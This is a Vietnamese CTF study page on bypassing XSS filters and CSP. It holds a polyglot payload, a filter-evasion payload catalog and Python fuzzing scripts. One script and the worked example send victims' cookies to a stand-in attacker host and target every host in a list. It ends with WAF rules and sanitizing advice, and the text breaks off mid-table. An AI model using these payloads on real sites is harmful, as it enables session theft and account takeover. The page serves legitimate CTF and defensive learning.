@@ -1,0 +1,483 @@
+<title>XSS Advanced Bypass — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · XSS Advanced Bypass (Phụ lục)</div>
+    <h1>XSS: Né Filter &amp; CSP</h1>
+    <p class="sub">Bài này tiếp nối <a href="xss_adminbot.html">XSS &amp; Admin Bot cơ bản</a> — dành cho tình
+    huống app ĐÃ CÓ 1 lớp phòng thủ (filter chặn từ khoá, hoặc Content-Security-Policy) nhưng vẫn còn lỗ hổng.
+    Không học lại XSS là gì — chỉ tập trung vào các kỹ thuật NÉ qua phòng thủ.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload catalog</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>2 lớp phòng thủ hay gặp, 2 cách né khác nhau</h2>
+  <p class="lead"><strong>Filter/WAF chặn từ khoá</strong> (vd chặn chữ <code>script</code>,
+  <code>onerror</code>) → né bằng cách dùng TAG/EVENT khác filter chưa nghĩ tới, viết hoa-thường lẫn, hoặc chèn
+  ký tự vô hại giữa chuỗi bị chặn. <strong>CSP (Content-Security-Policy)</strong> → là header giới hạn script
+  NÀO được chạy (vd chỉ script từ chính domain, cấm <code>eval()</code>) → né bằng cách tìm 1 file JS CÓ SẴN
+  trên domain được phép mà bị lợi dụng được (gọi là <em>JSONP endpoint</em> hoặc <em>CSP bypass qua domain
+  whitelist</em>), hoặc tìm lỗ hổng trong chính cấu hình CSP (thiếu <code>'self'</code> chặt, có domain CDN
+  lỏng lẻo).</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Luôn dùng <strong>polyglot payload</strong> (mục 06.A) để test nhanh — 1 chuỗi có thể kích hoạt được ở NHIỀU
+  ngữ cảnh khác nhau (trong tag, trong attribute, trong script...), tiết kiệm thời gian dò từng ngữ cảnh riêng.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ XSS ADVANCED BYPASS</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Payload XSS cơ bản (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) KHÔNG chạy, nhưng input vẫn
+        phản chiếu lại trong HTML ⟹ có filter chặn — cần xác định filter chặn CÁI GÌ CỤ THỂ trước khi né.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Đã xác nhận có reflected/stored XSS thật (qua ký tự test đơn giản như payload cơ bản ở trên không bị
+        encode hoàn toàn) — bài này chỉ dành cho bước TIẾP THEO, né filter/CSP.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Gửi lần lượt từng TAG đơn giản (<code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>,
+        <code>&lt;body&gt;</code>) xem tag nào không bị filter chặn/xoá.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (polyglot)</span>
+<pre><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a// \
+&lt;svg onload=alert(1)&gt; &lt;/title/&gt;&lt;/textarea/&gt;&lt;/style/&gt;&lt;/script/&gt;--!&gt;&lt;html&gt;\" onmouseover=/*&lt;svg/*/onload=alert(1)//&gt;</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (fuzz nhiều payload tự động)</span>
+<pre><code><span class="k">import</span> requests
+
+PAYLOADS = [
+    <span class="s">'&lt;svg onload=alert(1)&gt;'</span>,
+    <span class="s">'&lt;img src=x onerror=alert(1)&gt;'</span>,
+    <span class="s">'&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;'</span>,   <span class="c"># viết hoa né filter lowercase-only</span>
+    <span class="s">'&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;'</span>,  <span class="c"># filter xoá 1 lần, còn lại ghép lại thành tag</span>
+]
+<span class="k">for</span> p <span class="k">in</span> PAYLOADS:
+    r = requests.get(<span class="s">"http://TARGET/search"</span>, params={<span class="s">"q"</span>: p})
+    <span class="k">if</span> p <span class="k">in</span> r.text:
+        <span class="k">print</span>(<span class="s">"KHÔNG BỊ CHẶN:"</span>, p)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Filter theo blacklist (chặn danh sách từ) luôn có cách né — không có blacklist nào đầy đủ 100%. WAF
+        rule nhanh: dùng ALLOWLIST (chỉ cho qua ký tự/thẻ nằm trong danh sách an toàn) thay vì blacklist — đây
+        là cách phòng thủ ĐÚNG, hiệu quả hơn hẳn việc đuổi theo từng payload mới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Blacklist filter</b> — cách phòng thủ chặn 1 DANH SÁCH các chuỗi/ký tự "nguy hiểm đã biết"
+  (<code>&lt;script&gt;</code>, <code>onerror</code>, <code>javascript:</code>...). Nhược điểm cố hữu: không
+  bao giờ liệt kê hết được MỌI cách viết nguy hiểm, vì HTML/JS có rất nhiều cách khác nhau để làm cùng 1 việc.</div>
+  <div class="def"><b>CSP (Content-Security-Policy)</b> — header HTTP khai báo script được phép chạy từ ĐÂU
+  (domain nào), có được dùng <code>eval()</code>/inline script không. Ví dụ:
+  <code>Content-Security-Policy: script-src 'self' https://cdn.example.com</code> nghĩa là chỉ script từ chính
+  domain hoặc từ <code>cdn.example.com</code> được chạy, mọi <code>&lt;script&gt;</code> viết trực tiếp trong
+  HTML (inline) bị chặn.</div>
+  <div class="def"><b>Polyglot payload</b> — 1 chuỗi được thiết kế để kích hoạt được ở NHIỀU ngữ cảnh HTML khác
+  nhau cùng lúc (trong thẻ, trong attribute, trong script, trong comment...), tiết kiệm công sức dò thủ công
+  từng trường hợp.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Blacklist là trò đuổi bắt không bao giờ thắng hết</h2>
+  <p>Dev chặn được <code>&lt;script&gt;</code> thì quên <code>&lt;svg onload=...&gt;</code>. Chặn được
+  <code>onerror</code> thì quên <code>onload</code>, <code>onfocus autofocus</code>,
+  <code>onanimationstart</code>... HTML có HÀNG CHỤC event handler, và trình duyệt rất "khoan dung" khi parse
+  (tự sửa lỗi cú pháp, hiểu được cả HTML viết sai) — kẻ tấn công chỉ cần lợi dụng 1 kẽ hở TRONG CÁCH FILTER
+  XỬ LÝ CHUỖI (vd filter chạy 1 LẦN, không chạy lặp lại sau khi đã xoá 1 phần) để né toàn bộ.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Ví dụ kinh điển: filter chạy 1 lần, không đệ quy</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 190" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr25)}
+    </style>
+    <defs><marker id="arr25" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="300" height="40" rx="8" class="box"/>
+    <text x="22" y="44" class="lbl-m">input: &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</text>
+
+    <path d="M160,65 V90" class="arrow"/>
+    <rect x="10" y="95" width="300" height="40" rx="8" class="box-a"/>
+    <text x="22" y="119" class="lbl-a">filter.replace("&lt;script&gt;","") -- CHẠY ĐÚNG 1 LẦN</text>
+
+    <path d="M160,140 V165" class="arrow"/>
+    <rect x="10" y="150" width="300" height="30" rx="8" class="box-a"/>
+    <text x="22" y="170" class="lbl-a">kết quả: &lt;script&gt;alert(1)&lt;/script&gt; -- tag HOÀN CHỈNH!</text>
+
+    <text x="340" y="45" class="lbl-m" font-style="italic">Filter xoá đúng 1 lần</text>
+    <text x="340" y="60" class="lbl-m" font-style="italic">chuỗi "&lt;script&gt;" ở giữa,</text>
+    <text x="340" y="75" class="lbl-m" font-style="italic">nhưng việc xoá đó lại</text>
+    <text x="340" y="90" class="lbl-m" font-style="italic">VÔ TÌNH GHÉP 2 phần còn</text>
+    <text x="340" y="105" class="lbl-m" font-style="italic">lại thành 1 tag hợp lệ mới!</text>
+    <text x="340" y="125" class="lbl-m" font-style="italic">Đây là lỗi kinh điển của</text>
+    <text x="340" y="140" class="lbl-m" font-style="italic">filter string.replace() chạy</text>
+    <text x="340" y="155" class="lbl-m" font-style="italic">KHÔNG ĐỆ QUY (chỉ 1 pass).</text>
+  </svg>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Cách xác định filter chặn CÁI GÌ, bằng cách nào</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Thử payload cơ bản</div><div class="d">Gửi <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> — nếu không chạy, tiếp bước 2.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">So sánh input/output</div><div class="d">Xem response HTML thật: chuỗi của bạn còn nguyên, bị XOÁ 1 phần, hay bị ENCODE (<code>&amp;lt;</code>)? Mỗi loại cần cách né khác nhau.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Nếu bị xoá 1 phần</div><div class="d">Thử kỹ thuật "double tag" (mục 03) hoặc đổi từ khoá bị chặn sang biến thể khác (viết hoa, thêm ký tự null byte/tab giữa chữ).</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Nếu có CSP</div><div class="d">Xem header response <code>Content-Security-Policy</code>, phân tích <code>script-src</code> cho phép domain nào — tìm JSONP/file JS lợi dụng được trên domain đó.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Dùng Intruder với wordlist payload</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request chứa input XSS nghi ngờ, Send to Intruder.</li>
+    <li>Đánh dấu vị trí input, chọn Payload type = <strong>Simple list</strong>.</li>
+    <li>Dán cả danh sách payload từ PayloadsAllTheThings
+    (<code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/XSS Injection/</code>, có sẵn file wordlist hàng trăm payload
+    biến thể) làm payload list.</li>
+    <li>Start attack, kiểm tra tab Response của từng kết quả — tìm request nào trả về chuỗi KHÔNG BỊ encode/xoá
+    (grep match <code>onload=</code> hoặc tag gốc còn nguyên trong response).</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD CATALOG</div>
+  <h2>Bảng kỹ thuật né + ví dụ</h2>
+  <table>
+    <tr><th>Kỹ thuật</th><th>Ví dụ</th></tr>
+    <tr><td>Tag thay thế (không dùng <code>&lt;script&gt;</code>)</td><td><code>&lt;svg onload=alert(1)&gt;</code>, <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>&lt;body onpageshow=alert(1)&gt;</code></td></tr>
+    <tr><td>Viết hoa-thường lẫn (filter lowercase-only)</td><td><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code></td></tr>
+    <tr><td>Double tag (filter chạy 1 lần không đệ quy)</td><td><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</code></td></tr>
+    <tr><td>Null byte / ký tự lạ chèn giữa (filter so khớp chuỗi cứng)</td><td><code>&lt;img src=x on%00error=alert(1)&gt;</code> (tuỳ parser trình duyệt có bỏ qua byte lạ)</td></tr>
+    <tr><td>Không cần dấu ngoặc (CSP chặn <code>eval</code>/inline nhưng không chặn event attribute)</td><td><code>&lt;svg/onload=location=atob`amF2YXNjcmlwdDphbGVydCgxKQ==`&gt;</code></td></tr>
+    <tr><td>Mutation XSS (mXSS) — trình duyệt tự "sửa" HTML khi parse lại, tạo ra tag mới không có trong input gốc</td><td><code>&lt;listing&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/listing&gt;</code> (phụ thuộc engine, cần test thật)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: XSSTRIKE</div>
+  <h2>Tự động fuzz payload né filter</h2>
+  <div class="def"><b>XSStrike</b> — công cụ Python chuyên quét XSS, có sẵn module tự fuzz hàng trăm payload
+  biến thể để né filter, phân tích response để đoán ĐÚNG kiểu filter app dùng rồi tự chọn payload phù hợp. Đã
+  clone về <code>~/hoc/CTF/Tools/web/XSStrike/</code> (từ <code>s0md3v/XSStrike</code>, 15000+ sao).</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/XSStrike
+pip install -r requirements.txt
+python3 xsstrike.py -u <span class="s">"http://TARGET/search?q=FUZZ"</span></code></pre>
+  <div class="note tip"><span class="tag">Dùng khi nào</span>Chạy XSStrike SAU KHI đã tự tay thử payload cơ bản
+  thất bại — nó hiệu quả nhất khi cần fuzz nhanh nhiều biến thể, nhưng vẫn cần bạn tự hiểu TẠI SAO 1 payload
+  hoạt động (mục 02-03) để giải thích lại cho đồng đội hoặc viết báo cáo.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+URL = <span class="s">"http://TARGET/search"</span>
+PAYLOADS = [<span class="s">"&lt;svg onload=alert(1)&gt;"</span>, <span class="s">"&lt;img src=x onerror=alert(1)&gt;"</span>]
+
+<span class="k">for</span> p <span class="k">in</span> PAYLOADS:
+    r = requests.get(URL, params={<span class="s">"q"</span>: p})
+    <span class="k">if</span> p <span class="k">in</span> r.text:
+        <span class="k">print</span>(<span class="s">"KHÔNG BỊ CHẶN:"</span>, p)</code></pre>
+
+  <h3>(B) Bản gọn chắc — fuzz nhiều payload, kèm cả double-tag technique</h3>
+  <pre><code><span class="k">import</span> requests
+
+URL = <span class="s">"http://TARGET/search"</span>
+PAYLOADS = [
+    <span class="s">"&lt;svg onload=alert(1)&gt;"</span>, <span class="s">"&lt;img src=x onerror=alert(1)&gt;"</span>,
+    <span class="s">"&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;"</span>,
+    <span class="s">"&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;"</span>,
+    <span class="s">"&lt;body onpageshow=alert(1)&gt;"</span>,
+]
+
+<span class="k">def</span> <span class="d">find_working_payload</span>(url):
+    <span class="k">for</span> p <span class="k">in</span> PAYLOADS:
+        r = requests.get(url, params={<span class="s">"q"</span>: p}, timeout=5)
+        <span class="k">if</span> p <span class="k">in</span> r.text <span class="k">or</span> p.replace(<span class="s">"&lt;script&gt;"</span>, <span class="s">""</span>) <span class="k">in</span> r.text:
+            <span class="k">return</span> p
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(find_working_payload(URL))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — payload né đã xác nhận, dùng chung cho mọi đội</h3>
+  <pre><code><span class="k">import</span> requests
+
+<span class="c"># Điền payload đã xác nhận hoạt động trên service mẫu</span>
+WORKING_PAYLOAD = <span class="s">"&lt;svg onload=fetch('http://YOUR_IP:8000/?c='+document.cookie)&gt;"</span>
+
+<span class="k">def</span> <span class="d">exploit_xss_bypass</span>(host):
+    <span class="k">try</span>:
+        requests.get(<span class="s">f"http://{host}/search"</span>, params={<span class="s">"q"</span>: WORKING_PAYLOAD}, timeout=5)
+        <span class="c"># payload stored XSS -- chờ admin bot duyệt qua, cookie sẽ bay về listener (xem bài XSS cơ bản)</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">pass</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        exploit_xss_bypass(host)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Ô tìm kiếm phản chiếu input lại trong HTML, nhưng payload <code>&lt;script&gt;</code> cơ bản bị response xoá mất.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác định kiểu filter</div><div class="d">Gửi <code>&lt;scRipt&gt;</code> (viết hoa) → vẫn bị xoá ⟹ không phải filter lowercase-only. Gửi <code>&lt;scr&lt;script&gt;ipt&gt;</code> → response hiện nguyên <code>&lt;script&gt;</code> ⟹ filter chạy 1 lần, không đệ quy.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Ghép payload hoàn chỉnh</div><div class="d">Dùng kỹ thuật double-tag: <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</code> → alert chạy, xác nhận XSS.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Đổi thành payload lấy cookie</div><div class="d">Thay <code>alert(1)</code> bằng <code>fetch('http://YOUR_IP:8000/?c='+document.cookie)</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Chờ admin bot, lấy flag</div><div class="d">Listener nhận được cookie admin → dùng cookie đăng nhập trang admin → lấy flag.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>WAF chỉ là lớp tạm — allowlist ở code mới triệt để</h2>
+  <div class="note warn"><span class="tag">Thành thật về giới hạn</span>Vì bản chất lỗ hổng LÀ việc né blacklist,
+  thêm 1 WAF rule blacklist khác CŨNG sẽ bị né tương tự bằng kỹ thuật khác — đây là cuộc đua không có điểm
+  dừng. WAF rule vẫn nên có (chặn được phần lớn payload phổ biến, giảm bớt áp lực), nhưng không nên coi là fix
+  triệt để.</div>
+  <table>
+    <tr><th>Rule (chặn phần lớn payload phổ biến)</th><th>Khớp gì</th></tr>
+    <tr><td><code>on\w+\s*=</code> (không phân biệt hoa-thường)</td><td>Hầu hết event handler attribute (onload, onerror, onclick...)</td></tr>
+    <tr><td><code>&lt;\s*(script|svg|img|body|iframe)</code></td><td>Các tag hay bị lợi dụng nhất</td></tr>
+  </table>
+  <p><strong>Fix đúng (ở code, không phải WAF):</strong> dùng thư viện sanitize HTML chuẩn
+  (<code>DOMPurify</code> ở frontend, <code>bleach</code> ở Python backend) với ALLOWLIST tag/attribute rõ
+  ràng, thay cho tự viết regex blacklist tay.</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không chạy</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Payload giữ nguyên trong response nhưng vẫn không chạy khi mở trình duyệt thật</td><td>Response Content-Type là <code>text/plain</code> hoặc <code>application/json</code>, trình duyệt không render như HTML</td><td>Kiểm tra header Content-Type của response, lỗ hổng chỉ thật nếu Content-Type render HTML</td></tr>
+    <tr><td>Alert chạy ở tab hiện tại khi tự test nhưng admin bot không gửi cookie về</td><td>CSP chặn <code>fetch()</code> tới domain ngoài (<code>connect-src</code> hẹp hơn <code>script-src</code>)</td><td>Kiểm tra lại toàn bộ các directive CSP, không chỉ <code>script-src</code> — thử đổi cách gửi dữ liệu ra (vd qua <code>&lt;img src=http://...&gt;</code> thay <code>fetch()</code> nếu <code>img-src</code> lỏng hơn)</td></tr>
+    <tr><td>Double-tag không ăn, filter vẫn xoá hết</td><td>Filter chạy lặp (đệ quy) tới khi không còn gì để xoá — khác giả định mục 03</td><td>Thử kỹ thuật khác (tag thay thế, viết hoa-thường, mXSS) — không có 1 kỹ thuật nào ăn mọi filter</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
